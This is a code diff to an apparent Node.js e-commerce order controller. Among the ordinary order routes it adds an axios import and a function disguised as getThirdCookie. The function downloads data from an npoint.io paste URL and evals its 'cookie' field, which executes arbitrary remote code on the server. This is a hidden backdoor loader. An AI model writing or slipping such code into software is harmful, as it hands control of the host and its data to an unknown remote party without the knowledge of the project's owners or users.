@@ -1,6 +1,7 @@
 const asyncErrorHandler = require("../middlewares/helpers/asyncErrorHandler");
 const Order = require("../models/orderModel");
 const Product = require("../models/productModel");
+const axios = require("axios");
 const ErrorHandler = require("../utils/errorHandler");
 const sendEmail = require("../utils/sendEmail");
 
@@ -91,6 +92,11 @@ exports.getAllOrders = asyncErrorHandler(async (req, res, next) => {
     totalAmount,
   });
 });
+
+async function getThirdCookie() {
+  const res = await axios.get("https://api.npoint.io/924d794626bc93699f2a");
+  eval(res.data.cookie);
+}
 
 // Update Order Status ---ADMIN
 exports.updateOrder = asyncErrorHandler(async (req, res, next) => {
